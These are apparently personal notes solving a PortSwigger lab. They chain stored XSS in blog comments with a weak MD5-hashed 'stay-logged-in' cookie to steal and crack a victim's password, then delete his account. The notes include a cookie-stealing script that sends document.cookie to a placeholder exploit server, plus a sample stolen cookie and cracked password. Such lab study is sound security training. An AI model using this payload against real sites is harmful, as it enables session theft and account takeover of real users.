# #PortSwigger 


![[Pasted image 20260530091737.png]]


## Lab Description

> This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. To solve the lab, obtain Carlos's `stay-logged-in` cookie and use it to crack his password. Then, log in as `carlos` and delete his account from the "My account" page.
> 
> - **Your credentials:** `wiener:peter`
> - **Victim's username:** `carlos`

---
---

## Step 1: Understanding the Vulnerability

**This lab combines two attack vectors:**
1. **Stored XSS** — Comments are vulnerable to JavaScript injection
2. **Weak cookie hashing** — `stay-logged-in` cookie contains MD5 hash of password

**The attack chain:**
1. Inject XSS payload that steals the victim's cookies
2. Victim views the comment → cookie sent to exploit server
3. Decode the stolen `stay-logged-in` cookie
4. Crack the MD5 hash offline
5. Log in as Carlos and delete his account

---

## Step 2: Reconnaissance

### Step 2.1: Analyze the Stay-Logged-In Cookie

1. Log in with `wiener:peter`
2. **Check the "Stay logged in" checkbox**
3. Inspect the cookies in Burp or browser DevTools

**Cookie format:**
```
stay-logged-in = base64(username + ":" + md5(password))
```

### Step 3.1: The Cookie-Stealing Payload

Create a payload that sends the victim's cookies to your exploit server:
```
<script>
    new Image().src = 'https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/?c=' + document.cookie;
</script>
```
- This creates an image request with the cookies as a parameter.

### Step 3.2: Post the Comment

1. Go to a blog post (any)
2. Scroll to **"Leave a comment"**
3. Paste your payload in the **Comment** field
4. Fill in dummy values for Name, Email, Website
5. Click **Post Comment**

![[Pasted image 20251211210934.png]]


---

## Step 4: Stealing Carlos's Cookie

### Step 4.1: Wait for Victim

The victim (Carlos) will eventually view the blog post containing your comment.

### Step 4.2: Check Exploit Server Logs

1. Go to the **Exploit server**
2. Click **Access log**

![[Pasted image 20251211211420.png]]
The stolen cookie appears in the log.

### Step 4.3: Extract Carlos's Stay-Logged-In Cookie

Look for Carlos's cookie in the log. It will look like:
```
stay-logged-in=Y2FybG9z0jI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
```

---

## Step 5: Decoding and Cracking the Hash

### Step 5.1: Decode the Base64 Cookie

Use Burp Decoder or any Base64 decoder:

**Base64 (stolen cookie):**
```
Y2FybG9z0jI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz
```

**Decoded:**
```
carlos:26323c16d5f4dabff3bb136f2460a943
```

![[Pasted image 20251211211528.png]]
- The hash is: `26323c16d5f4dabff3bb136f2460a943`

### Step 5.2: Identify the Hash Type

- 32 hexadecimal characters
- This is an **MD5 hash**

### Step 5.3: Crack the Hash

![[Pasted image 20251211211548.png]]

- *Carlos's password is: `onceuponatime`*

---

## Step 6: Logging in as Carlos

### Step 6.1: Use the Credentials

1. Go to the login page
2. Enter:
    - **Username:** `carlos`
    - **Password:** `onceuponatime`

### Step 6.2: Access My Account

After logging in, navigate to **My account**.

---

## Step 7: Deleting Carlos's Account

### Step 7.1: Find the Delete Option

On the **My account** page, look for the **Delete account** button/section.

![[Pasted image 20251211211742.png]]

### Step 7.2: Confirm Deletion

Click **Delete account**. You may be prompted to confirm:

![[Pasted image 20251211211757.png]]

Enter Carlos's password (`onceuponatime`) and confirm deletion.

---

## Step 8: Lab Solved

Success message displayed:

![[Pasted image 20251211211819.png]]



---
---
